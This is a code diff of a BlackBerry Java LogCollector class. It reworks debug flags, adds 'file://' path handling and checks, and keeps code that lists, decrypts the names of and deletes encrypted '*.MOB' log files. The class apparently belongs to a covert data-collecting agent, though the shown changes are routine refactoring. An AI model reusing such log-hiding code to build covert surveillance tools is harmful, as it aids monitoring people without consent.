@@ -36,12 +36,12 @@ import blackberry.utils.StringSortVector;
 /**
  * The Class LogCollector.
  * 
- * @author user1
- *         TODO Ordinare le cartelle e i file
+ * @author user1 TODO Ordinare le cartelle e i file
  */
 public final class LogCollector implements Singleton {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("LogCollector", DebugLevel.INFORMATION);
+    private static Debug debug = new Debug("LogCollector",
+            DebugLevel.INFORMATION);
     //#endif
 
     static LogCollector instance = null;
@@ -99,7 +99,7 @@ public final class LogCollector implements Singleton {
         if (instance == null) {
             instance = (LogCollector) RuntimeStore.getRuntimeStore().get(GUID);
             if (instance == null) {
-                LogCollector singleton = new LogCollector();
+                final LogCollector singleton = new LogCollector();
                 RuntimeStore.getRuntimeStore().put(GUID, singleton);
                 instance = singleton;
             }
@@ -135,7 +135,7 @@ public final class LogCollector implements Singleton {
     }
 
     public synchronized void removeProgressive() {
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("Removing Progressive");
         //#endif
         PersistentStore.destroyPersistentObject(PERSISTENCE_KEY);
@@ -147,7 +147,7 @@ public final class LogCollector implements Singleton {
         final Object obj = logProgressivePersistent.getContents();
 
         if (obj == null) {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("First time of logProgressivePersistent");
             //#endif
             logProgressivePersistent.setContents(new Integer(1));
@@ -197,7 +197,7 @@ public final class LogCollector implements Singleton {
         logProgressive++;
         logProgressivePersistent.setContents(new Integer(logProgressive));
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("Progressive: " + logProgressive);
 
         //#endif
@@ -225,7 +225,7 @@ public final class LogCollector implements Singleton {
      *            the agent
      * @return the vector
      */
-    public synchronized Vector makeNewName(final Log log, final boolean onSD) {        
+    public synchronized Vector makeNewName(final Log log, final boolean onSD) {
         final Date timestamp = log.timestamp;
         final int progressive = getNewProgressive();
 
@@ -275,7 +275,7 @@ public final class LogCollector implements Singleton {
      *            the log name
      */
     public void remove(final String logName) {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("Removing file: " + logName);
         //#endif
         final AutoFlashFile file = new AutoFlashFile(logName, false);
@@ -293,7 +293,7 @@ public final class LogCollector implements Singleton {
      */
 
     public synchronized void removeLogDirs() {
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("removeLogDirs");
         //#endif
         removeLogRecursive(Path.SD(), true);
@@ -302,14 +302,15 @@ public final class LogCollector implements Singleton {
 
     private void removeLogRecursive(final String basePath, final boolean delete) {
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("RemovingLog: " + basePath);
-
+        Check.requires(!basePath.startsWith("file://"),
+                "basePath shouldn't start with file:// : " + basePath);
         //#endif
 
         FileConnection fc;
         try {
-            fc = (FileConnection) Connector.open(basePath);
+            fc = (FileConnection) Connector.open("file://" + basePath);
 
             if (fc.isDirectory()) {
                 final Enumeration fileLogs = fc.list("*", true);
@@ -317,7 +318,7 @@ public final class LogCollector implements Singleton {
                 while (fileLogs.hasMoreElements()) {
                     final String file = (String) fileLogs.nextElement();
 
-                    //#ifdef DEBUG_TRACE
+                    //#ifdef DEBUG
                     debug.trace("removeLog: " + file);
 
                     //#endif
@@ -332,7 +333,7 @@ public final class LogCollector implements Singleton {
             fc.close();
 
         } catch (final IOException e) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("removeLog: " + basePath + " ex: " + e);
             //#endif
         }
@@ -349,13 +350,15 @@ public final class LogCollector implements Singleton {
     public Vector scanForDirLogs(final String currentPath) {
         //#ifdef DBC
         Check.requires(currentPath != null, "null argument");
+        Check.requires(!currentPath.startsWith("file://"),
+                "currentPath shouldn't start with file:// : " + currentPath);
         //#endif
 
         final StringSortVector vector = new StringSortVector();
         FileConnection fc;
 
         try {
-            fc = (FileConnection) Connector.open(currentPath);
+            fc = (FileConnection) Connector.open("file://" + currentPath);
 
             if (fc.isDirectory()) {
                 final Enumeration fileLogs = fc.list(Path.LOG_DIR_BASE + "*",
@@ -366,7 +369,7 @@ public final class LogCollector implements Singleton {
                     // scanForLogs(dir);
                     // return scanForLogs(file);
                     vector.addElement(dir);
-                    //#ifdef DEBUG_TRACE
+                    //#ifdef DEBUG
                     debug.trace("scanForDirLogs adding: " + dir);
                     //#endif
 
@@ -378,13 +381,13 @@ public final class LogCollector implements Singleton {
             fc.close();
 
         } catch (final IOException e) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("scanForDirLogs: " + e);
             //#endif
 
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("scanForDirLogs #: " + vector.size());
 
         //#endif
@@ -394,8 +397,8 @@ public final class LogCollector implements Singleton {
 
     /**
      * Estrae la lista di log nella forma *.MOB dentro la directory specificata
-     * da currentPath, nella forma 1_n
-     * Restituisce la lista ordinata secondo il nome demangled
+     * da currentPath, nella forma 1_n Restituisce la lista ordinata secondo il
+     * nome demangled
      * 
      * @param currentPath
      *            the current path
@@ -406,6 +409,8 @@ public final class LogCollector implements Singleton {
     public Vector scanForLogs(final String currentPath, final String dir) {
         //#ifdef DBC
         Check.requires(currentPath != null, "null argument");
+        Check.requires(!currentPath.startsWith("file://"),
+                "currentPath shouldn't start with file:// : " + currentPath);
         //#endif
 
         final DoubleStringSortVector vector = new DoubleStringSortVector();
@@ -413,7 +418,7 @@ public final class LogCollector implements Singleton {
         FileConnection fcDir = null;
         // FileConnection fcFile = null;
         try {
-            fcDir = (FileConnection) Connector.open(currentPath + dir);
+            fcDir = (FileConnection) Connector.open("file://" + currentPath + dir);
 
             final Enumeration fileLogs = fcDir.list("*", true);
 
@@ -428,11 +433,11 @@ public final class LogCollector implements Singleton {
 
                 if (file.endsWith(encLogMask)) {
                     // String encName = fcFile.getName();
-                    //#ifdef DEBUG_TRACE
+                    //#ifdef DEBUG
                     debug.trace("enc name: " + file);
                     //#endif
                     final String plainName = decryptName(file);
-                    //#ifdef DEBUG_INFO
+                    //#ifdef DEBUG
                     debug.info("plain name: " + plainName);
                     //#endif
 
@@ -441,7 +446,7 @@ public final class LogCollector implements Singleton {
             }
 
         } catch (final IOException e) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("scanForLogs: " + e);
             //#endif
 
@@ -456,7 +461,7 @@ public final class LogCollector implements Singleton {
             }
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("scanForLogs numDirs: " + vector.size());
 
         //#endif
